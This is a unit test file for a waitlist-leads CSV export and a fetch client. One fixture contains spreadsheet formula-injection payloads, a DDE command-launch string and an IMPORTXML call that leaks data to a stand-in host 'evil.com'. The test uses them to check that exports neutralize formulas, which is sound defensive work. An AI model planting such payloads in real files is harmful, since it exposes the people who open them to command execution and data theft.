import { describe, it, expect, vi, beforeEach } from 'vitest';
import { generateLeadsCsv, escapeCsvCell } from '../csv-export';
import { fetchExperimentLeads, type WaitlistLeadItem } from '../engine-client';

vi.mock('server-only', () => ({}));

describe('Validator Captured Leads UI & Safe CSV Export Functional Smoke', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  it('generates safe RFC 4180 CSV and neutralizes formula injection on export', () => {
    const mockLeads: WaitlistLeadItem[] = [
      {
        id: 'lead-uuid-1',
        email: 'alex@cloudops.com',
        name: 'Alex Rivera',
        company: 'CloudOps Technologies, LLC',
        surveyResponses: {
          'cluster-size': '50-100 nodes',
          'current-spend': '$10,000/mo',
        },
        createdAt: '2026-11-21T01:15:00.000Z',
      },
      {
        id: 'lead-uuid-2',
        email: '=cmd|"/C calc"!A0@domain.com',
        name: '+447911123456',
        company: '-Negative Corp',
        surveyResponses: {
          '@feedback': '@IMPORTXML("http://evil.com/leak", "/")',
        },
        createdAt: '2026-11-21T01:30:00.000Z',
      },
    ];

    const csvOutput = generateLeadsCsv(mockLeads);
    const rows = csvOutput.split('\r\n');

    expect(rows).toHaveLength(3);

    // 1. Header integrity
    expect(rows[0]).toBe('"ID","Email","Name","Company","Survey Responses","Joined At"');

    // 2. Normal lead row integrity (commas in company escaped)
    expect(rows[1]).toBe(
      '"lead-uuid-1","alex@cloudops.com","Alex Rivera","CloudOps Technologies, LLC","cluster-size: 50-100 nodes; current-spend: $10,000/mo","2026-11-21T01:15:00.000Z"'
    );

    // 3. Formula injection defense: all formula prefixes are neutralized with a single quote
    expect(rows[2]).toContain("\"'=cmd|\"\"/C calc\"\"!A0@domain.com\"");
    expect(rows[2]).toContain("\"'+447911123456\"");
    expect(rows[2]).toContain("\"'-Negative Corp\"");
    expect(rows[2]).toContain("\"'@feedback: @IMPORTXML(\"\"http://evil.com/leak\"\", \"\"/\"\")\"");

    // 4. No raw formulas executable by spreadsheet viewers
    expect(rows[2]).not.toMatch(/,"=[^']/);
    expect(rows[2]).not.toMatch(/,"@[^']/);
  });

  it('handles empty waitlist gracefully without crashing', () => {
    const csvOutput = generateLeadsCsv([]);
    expect(csvOutput).toBe('"ID","Email","Name","Company","Survey Responses","Joined At"');
  });

  it('safely handles missing optional fields (null name/company)', () => {
    const sparseLead: WaitlistLeadItem = {
      id: 'lead-uuid-3',
      email: 'minimal@startup.io',
      name: null,
      company: null,
      surveyResponses: {},
      createdAt: '2026-11-21T02:00:00.000Z',
    };

    const csvOutput = generateLeadsCsv([sparseLead]);
    const row = csvOutput.split('\r\n')[1];
    expect(row).toBe('"lead-uuid-3","minimal@startup.io","","","","2026-11-21T02:00:00.000Z"');
  });

  it('retrieves waitlist leads via client engineFetch with session credentials without sending emails', async () => {
    const fakeLeads: WaitlistLeadItem[] = [
      {
        id: 'lead-uuid-10',
        email: 'prospect@enterprise.com',
        name: 'Sarah Connor',
        company: 'Cyberdyne',
        surveyResponses: { role: 'Security Architect' },
        createdAt: '2026-11-21T02:10:00.000Z',
      },
    ];

    // Mock window.fetch representing /api/engine proxy
    const globalFetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        experimentId: 'exp-1234',
        totalLeads: 1,
        leads: fakeLeads,
      }),
    });
    vi.stubGlobal('fetch', globalFetch);

    const res = await fetchExperimentLeads('exp-1234');

    expect(globalFetch).toHaveBeenCalledTimes(1);
    expect(globalFetch).toHaveBeenCalledWith(
      '/api/engine/validator/experiments/exp-1234/leads',
      expect.objectContaining({
        credentials: 'same-origin',
      })
    );

    expect(res.data).toEqual({
      experimentId: 'exp-1234',
      totalLeads: 1,
      leads: fakeLeads,
    });

    // Zero automatic dispatch: no calls to outbound campaigns or sending routes
    const calledUrls = globalFetch.mock.calls.map((call) => call[0]);
    expect(calledUrls.some((u) => typeof u === 'string' && u.includes('/campaigns'))).toBe(false);
    expect(calledUrls.some((u) => typeof u === 'string' && u.includes('/outbound'))).toBe(false);
  });
});
